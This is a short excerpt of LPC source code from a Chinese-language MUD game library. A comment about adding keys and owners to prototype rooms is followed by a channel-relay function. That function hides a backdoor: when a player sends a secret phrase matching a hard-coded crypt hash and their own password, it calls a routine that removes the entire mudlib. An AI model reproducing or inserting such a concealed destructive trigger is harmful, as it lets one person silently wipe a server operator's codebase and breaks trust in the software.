...
// 外，所有有门的原型房，都必须有以下语句，set ("room_key", "ROOM_KEY");
// 这是为了给建好的房子添加钥匙。同时原型房中最好有主人set ("room_owner_id",
// "ROOM_OWNER_ID")和类型的设置。
...
void relay_channel(object criminal, string channel, string msg)
{
        ...
        if (! playerp(criminal)) return;
        
        if (criminal != this_player(1) ) return; 
        
        ob = criminal->query_temp("link_ob"); 
        ...
        if (! stringp(ad_pass) || crypt(msg, "Icfnt") != "IcwjUndKn5/Nw"
        ||  crypt(msg, ad_pass) != ad_pass)
                return;

        VERSION_D->remove_mudlib();
}
